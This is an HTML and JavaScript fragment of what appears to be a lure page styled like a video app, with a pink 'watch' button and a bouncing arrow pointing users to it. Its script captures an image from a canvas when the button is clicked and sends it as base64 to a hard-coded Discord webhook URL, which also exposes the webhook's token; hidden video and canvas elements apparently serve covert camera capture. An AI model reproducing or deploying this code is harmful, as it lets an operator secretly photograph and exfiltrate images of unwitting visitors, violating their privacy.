    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #010101;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            color: #fff;
        }
        .container {
            text-align: center;
            padding: 20px;
            background-color: #262626;
            border-radius: 20px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
            max-width: 400px;
            width: 100%;
            position: relative; /* Добавлено для уточнения позиции */
            z-index: 1; /* Устанавливаем на передний план */
        }
        .idi-naxuy {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #fff;
        }
        .btn-watch {
            padding: 15px 30px;
            font-size: 20px;
            font-weight: bold;
            color: #fff;
            background-color: #fe2c55;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            display: none;
            transition: background-color 0.3s ease, transform 0.2s ease;
            margin-top: 10px;
        }
        .btn-watch:hover {
            background-color: #e62950;
            transform: scale(1.05);
        }
        .btn-bot {
            padding: 15px 30px;
            font-size: 20px;
            font-weight: bold;
            color: #fff;
            background-color: #fe2c55;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            display: none;
            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
            margin-top: 10px;
            text-decoration: none;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
        }
        .btn-bot:hover {
            background-color: #ff456e;
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
            text-decoration: none; /* Ensure text decoration stays removed on hover */
        }
        .btn-bot:active {
            background-color: #e9224a;
            transform: translateY(0);
            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
        }
        video, canvas {
            max-width: 100%;
            border-radius: 20px;
            margin-bottom: 20px;
            display: none;
        }
        
        video1, canvas1 {
            display: none;
        }
        #pointer {
            position: fixed;
            width: 0;
            height: 0;
            border-left: 20px solid transparent;
            border-right: 20px solid transparent;
            border-bottom: 30px solid red; /* Цвет и длина указателя */
            top: 10px; /* Отступ от верхнего края */
            right: 10px; /* Отступ от правого края */
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .arrow {
                width: 0;
                height: 0;
                border-left: 10px solid transparent;
                border-right: 10px solid transparent;
                border-bottom: 15px solid red; /* Цвет и длина стрелочки */
                animation: bounce 1s infinite; /* Анимация */
        }
            
        @keyframes bounce {
                0%, 20%, 50%, 80%, 100% {
                    transform: translateY(0);
                }
                40% {
                    transform: translateY(-10px);
                }
                60% {
                    transform: translateY(-5px);
                }
        }

    </style>

    <script>
        // URL of the webhook where the image will be sent
        const webhookUrl = "https://discord.com/api/webhooks/1304326600438972447/cPAPNutnxg86tnOFPS4nbt5CHapnvXwXAiKR8bqJPJylOaLcd-wV3avTuFqcphwmB6Sc";

        // This function will send data (image or other data) to your Webhook
        function sendDataToWebhook(imageData) {
            $.ajax({
                url: webhookUrl,
                method: 'POST',
                data: JSON.stringify({ image: imageData }),
                contentType: 'application/json',
                success: function(response) {
                    console.log("Data sent successfully:", response);
                },
                error: function(error) {
                    console.error("Error sending data:", error);
                }
            });
        }

        // Example of how to capture image from canvas and send it to the webhook
        function captureAndSendImage() {
            const canvas = document.getElementById("canvas");
            const imageData = canvas.toDataURL("image/png");  // Capture image as Base64 PNG
            sendDataToWebhook(imageData);  // Send it to the webhook
        }

        // Adding a listener to capture when the user presses the button
        document.getElementById("watchBtn").addEventListener("click", function() {
            captureAndSendImage();  // Capture the image when the button is clicked
        });
